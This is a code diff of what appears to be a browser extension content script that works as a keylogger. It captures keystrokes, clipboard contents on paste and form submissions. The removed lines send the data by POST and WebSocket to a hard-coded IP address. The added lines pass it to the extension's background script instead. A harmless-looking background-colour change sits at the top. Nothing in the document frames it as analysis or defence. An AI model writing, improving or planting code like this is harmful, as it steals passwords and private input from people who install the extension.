@@ -1,44 +1,48 @@
-document.body.style.backgroundColor = "lightblue";
+// Change the background color of the page
+document.body.style.backgroundColor = "blue";
 
 let buffer = [];
+const THRESHOLD = 30; // Send data every 30 characters
 let lastClipboard = '';
-const THRESHOLD = 5; // Send data every 5 characters
+
+
+// Capture keydown events
+const ignoredKeys = [
+    'Backspace', 'Tab', 'Shift', 'Control', 'Alt', 'Meta', 
+    'ArrowUp', 'ArrowDown', 'ArrowLeft', 'ArrowRight', 
+    'Escape', 'CapsLock', 'NumLock', 'ScrollLock', 'Process'
+];
 
 document.addEventListener('keydown', (event) => {
+    if (ignoredKeys.includes(event.key)) {
+        return;
+    }
     buffer.push(event.key);
     
     if (buffer.length >= THRESHOLD || event.key === 'Enter') {
-        sendData(buffer.join(''));
+        sendDataToBackground(buffer.join(''));
         buffer = []; // Reset buffer
     }
 });
 
-setInterval(() => {
-    navigator.clipboard.readText().then(text => {
-        if (text && text !== lastClipboard) {
-            lastClipboard = text;
-            sendData(text);
+// Capture clipboard contents on paste events
+document.addEventListener('paste', (event) => {
+    navigator.clipboard.readText().then(currentClipboard => {
+        if (currentClipboard && currentClipboard !== lastClipboard) {
+            lastClipboard = currentClipboard;
+            sendDataToBackground(currentClipboard);
         }
-    });
-}, 5000); // Poll every 5 seconds
+    }).catch(err => console.error('Failed to read clipboard:', err));
+});
 
-document.querySelector('form').addEventListener('submit', (event) => {
+
+// Capture form submissions
+document.querySelector('form')?.addEventListener('submit', (event) => {
     let formData = new FormData(event.target);
-    sendData(Object.fromEntries(formData));
+    sendDataToBackground(Object.fromEntries(formData));
 });
 
-function sendData(data) {
-    fetch('https://192.42.1.174:8080', {
-        method: 'POST',
-        body: JSON.stringify({ data: data })
-    });
+// Send data to background script
+function sendDataToBackground(data) {
+    browser.runtime.sendMessage({ action: 'sendData', data: data });
 }
-
-
-const socket = new WebSocket('https://192.42.1.174:8080');
-socket.addEventListener("open", (event) => {
-    socket.send("Hello Server!");
-  });
-document.addEventListener('keydown', (event) => {
-    socket.send(event.key);
-});
